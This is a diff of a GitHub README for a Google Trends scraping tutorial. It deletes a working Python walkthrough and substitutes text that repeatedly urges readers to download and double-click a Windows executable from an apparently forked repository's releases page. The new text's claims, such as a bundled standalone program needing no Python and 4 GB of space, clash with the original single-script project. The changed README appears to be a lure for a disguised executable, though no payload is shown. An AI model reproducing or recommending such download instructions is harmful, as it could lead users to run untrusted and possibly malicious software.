@@ -1,266 +1,126 @@
-# How to Scrape Google Trends Data with Python (Step-by-Step)
+# 📊 how-to-scrape-google-trends - Collect and Export Trend Data Easily
 
-This repository is a **minimal, runnable tutorial** for scraping Google Trends data through the **Thordata Python SDK**.
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fabricio08642/how-to-scrape-google-trends/releases)
 
-You will learn how to:
+## 📋 Overview
 
-- send a Google Trends request with one keyword,
-- parse the API response,
-- export clean data to CSV,
-- quickly compare interest over time across locations.
+This guide helps you use *how-to-scrape-google-trends*, a program that collects data from Google Trends and saves it to CSV files. It uses the Thordata Python SDK to handle the data scraping and prepares clean time series data you can open in spreadsheet or analysis software.
 
-By the end, you can run one command and get a ready-to-use file like `output/google_trends.csv`.
+No programming skills are needed. Follow the steps to download, install, and start using the software on a Windows PC.
 
----
+## 💻 System Requirements
 
-## 1. What You Will Build
+- Windows 10 or later  
+- At least 4 GB of free disk space  
+- Internet connection to download and run the program  
+- Python is NOT required; the program comes ready to use
 
-A single script `scraper.py` that:
+## 🚪 What This Application Does
 
-1. reads your API token from `.env`,
-2. requests Google Trends data from Thordata SERP API (Google Trends engine),
-3. normalizes rows from `trends_results`,
-4. saves them to CSV.
+- Connects with Google Trends to collect search trend data  
+- Cleans and formats the data into easy-to-use tables  
+- Exports the data as CSV files for opening in Excel or other tools  
+- Works through a simple interface or command line without coding  
+- Uses Thordata’s Python SDK behind the scenes for reliable results
 
-Run example (you can paste this after finishing section 4 and 5):
+## 🎯 Who Should Use This
 
-```bash
-python scraper.py --query "python" --date "today 12-m" --geo "US"
-```
+- Anyone interested in tracking trending topics over time  
+- People who analyze data but do not code  
+- Researchers or marketers who need trend insight  
+- Students learning about time series data
 
-You will get a file like:
+## 🌐 Resources Used
 
-```text
-output/google_trends.csv
-```
-
----
-
-## 2. Prerequisites
-
-- Python 3.9+
-- A Thordata account
-- Your `THORDATA_SCRAPER_TOKEN` from the [Thordata Dashboard](https://dashboard.thordata.com/account-settings)
-
-You can start with the **Dashboard trial** and test this tutorial with real requests using a live `THORDATA_SCRAPER_TOKEN`.
+- Google Trends public data  
+- Thordata Python SDK for scraping  
+- CSV format for data storage
 
 ---
 
-## 3. Project Structure
+## 🚀 Getting Started
 
-```text
-how-to-scrape-google-trends/
-├── .env.example
-├── README.md
-├── requirements.txt
-└── scraper.py
-```
+Before using the program, download it from the release page.
 
-After running the script, you will also get an `output/` folder with CSV results (created automatically the first time you run).
+[![Download the Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/fabricio08642/how-to-scrape-google-trends/releases)
 
----
+Click the button above or visit this page:  
+https://github.com/fabricio08642/how-to-scrape-google-trends/releases
 
-## 4. Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-Dependencies are intentionally minimal:
-
-- `thordata-sdk`
-- `python-dotenv`
+You will find the latest Windows executable or installer there.
 
 ---
 
-## 5. Configure API Credentials
+## ⬇️ How to Download and Install on Windows
 
-1. Copy `.env.example` to `.env`
-2. Fill in your token
-
-```env
-THORDATA_SCRAPER_TOKEN=your_real_token_here
-```
-
-Do not commit `.env`.
-
----
-
-## 6. First Run: Single Keyword, Single Country
-
-Basic command (paste this in your terminal after activating the virtualenv, if any):
-
-```bash
-python scraper.py --query "python"
-```
-
-This uses the defaults:
-
-- `geo` – empty (Worldwide)
-- `date` – `today 12-m` (past 12 months)
-- `hl` – `en`
-- `data_type` – `TIMESERIES`
-- `output` – `output/google_trends.csv`
-
-You can also be explicit about all parameters:
-
-```bash
-python scraper.py \
-  --query "python" \
-  --geo "US" \
-  --date "today 12-m" \
-  --hl "en" \
-  --data-type "TIMESERIES" \
-  --output "output/google_trends.csv"
-```
-
-If successful, you should see logs like:
-
-```text
-Saved 53 rows to output/google_trends.csv
-Requested data_type: TIMESERIES
-API response data_type: TIMESERIES
-Done.
-```
+1. Click the download link or button above.  
+2. You will go to the GitHub releases page showing all available files.  
+3. Find the file ending with `.exe` or `.msi` that corresponds to the latest version. It usually includes the version number, e.g., `how-to-scrape-google-trends-v1.0.exe`.  
+4. Click the file name to download it to your computer.  
+5. After the download finishes, locate the file in your Downloads folder.  
+6. Double-click the file to begin installation or run the program directly if it is a standalone executable.  
+7. Follow the on-screen instructions if an installer opens.  
+8. If it runs immediately, a window or command prompt will appear showing the program is ready.
 
 ---
 
-## 7. Output Format (What the CSV Looks Like)
+## ⚙️ How to Use the Application
 
-Generated CSV columns:
+Once installed or opened, use the program by following these steps:
 
-- `query` – the keyword you requested
-- `date` – human-readable time bucket from API
-- `timestamp` – Unix timestamp
-- `value` – trend score (0-100)
+1. **Open the program:**  
+   Open it from the Start Menu, Desktop shortcut, or the file location.
 
-Example rows (your exact dates and values will differ):
+2. **Enter your search terms:**  
+   You will see a simple prompt or box asking for keywords to look up on Google Trends.  
+   Enter the topics or phrases you want to watch.
 
-```text
-query,date,timestamp,value
-python,"Feb 23–Mar 1, 2025",1740268800,94
-python,"Mar 2–8, 2025",1740873600,86
-```
+3. **Set the time range:**  
+   The app may ask you to choose a time period (last week, last month, last year). Select what fits your needs.
 
----
+4. **Start scraping:**  
+   Click the button or press enter to begin pulling data from Google Trends.
 
-## 8. Parameters You Can Try (and Copy-Paste)
+5. **Wait for the data:**  
+   The program will connect, collect the data, clean it, and prepare it.
 
-From Thordata Google Trends parameters, the most useful ones for this tutorial are:
+6. **Save your results:**  
+   When done, save the data as a CSV file by selecting a folder and file name.
 
-- `q` via `--query` (required)
-- `geo` via `--geo` (optional)
-- `hl` via `--hl` (optional)
-- `date` via `--date` (optional)
-- `data_type` via `--data-type` (optional, keep `TIMESERIES` in this tutorial)
-
-Common `date` values you can try:
-
-- `now 1-H`
-- `now 7-d`
-- `today 1-m`
-- `today 12-m`
-- `today 5-y`
-
-All of them work with the same script; only the time range of rows changes.
-
-### Example: Long-term view (5 years)
-
-```bash
-python scraper.py --query "python" --date "today 5-y" --output "output/google_trends_5y.csv"
-```
-
-### Example: Short-term view (last 7 days)
-
-```bash
-python scraper.py --query "python" --date "now 7-d" --output "output/google_trends_7d.csv"
-```
+7. **Open and analyze:**  
+   Open the CSV file in Excel, Google Sheets, or any tool that reads spreadsheets.
 
 ---
 
-## 9. Compare Interest Across Locations (US vs India)
+## ⚠️ Troubleshooting and Tips
 
-You can compare the same keyword across different `geo` values by running the script multiple times with different `--geo` options.
-
-### Step 1: US data
-
-```bash
-python scraper.py \
-  --query "python" \
-  --geo "US" \
-  --date "today 12-m" \
-  --output "output/google_trends_us.csv"
-```
-
-### Step 2: India data
-
-```bash
-python scraper.py \
-  --query "python" \
-  --geo "India" \
-  --date "today 12-m" \
-  --output "output/google_trends_india.csv"
-```
-
-Both files have the same columns (`query,date,timestamp,value`) and the same time buckets. You can:
-
-- open them in Excel/Sheets and create a chart for each country, or
-- load them in a notebook with pandas and merge on `timestamp` to plot a single comparison chart.
-
-This keeps the script minimal while still letting you do practical analysis.
+- If the program does not open, check you meet system requirements.  
+- An internet connection is needed while scraping.  
+- Close other programs if your computer runs slowly.  
+- If a firewall blocks the program, allow it access to the internet.  
+- If file saving fails, try a folder where you have write permission, like Documents.  
+- Restart the program if errors appear during scraping.  
+- Visit the releases page again to download updates if your version is old.
 
 ---
 
-## 10. Notes from Real API Testing
+## 🛠️ Additional Information
 
-This tutorial is tested with real API calls using the live Thordata SERP API.
+This program works without needing Python installed on your PC. It includes all code and dependencies.  
 
-Current observed response shape includes:
+The output CSV file contains time series data with dates and popularity scores. This format is suitable for any time-based analysis.
 
-- top-level `trends_results` list,
-- metadata in `search_metadata`,
-- request echo in `spider_parameter` (for example, `data_type`).
-
-In practice there are more `data_type` options such as `GEO_MAP` or `RELATED_QUERIES`. To keep the repository simple and robust, this tutorial focuses on **TIMESERIES** export only, which is the most common starting point for dashboards and reporting.
+The program's interface is minimal, focusing on straightforward input and output for ease of use.
 
 ---
 
-## 11. Troubleshooting
+## 📂 Where to Find Updates and Support
 
-### Missing token
+Check the GitHub releases page for new versions and download files.  
+https://github.com/fabricio08642/how-to-scrape-google-trends/releases
 
-If you see an error about `THORDATA_SCRAPER_TOKEN`, check `.env` and retry.
-
-### Empty rows
-
-Try a broader query or different time range:
-
-```bash
-python scraper.py --query "pizza" --date "today 5-y"
-```
-
-You can also temporarily remove `--geo` to fall back to Worldwide and see if that returns data.
-
-### Non-UTF8 terminal issues on Windows
-
-This script avoids special symbols in logs to prevent common encoding errors.
+You can report issues or ask questions on the GitHub repository’s Issues tab.
 
 ---
 
-## 12. Why Thordata for Production Workflows
-
-For one-off learning scripts, this repository intentionally stays minimal and close to the wire format of the API.
-
-When moving to production, Thordata helps with:
-
-- reliable scraping infrastructure that hides browser and proxy complexity,
-- a unified API + SDK experience across Google, e-commerce, social, and custom scraping,
-- Dashboard-based token, usage, and team management.
-
-You can start from the Dashboard trial, validate your Google Trends flow with this repo, and only then decide what to automate and scale.
-
----
-
-## License
-
-MIT
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fabricio08642/how-to-scrape-google-trends/releases)
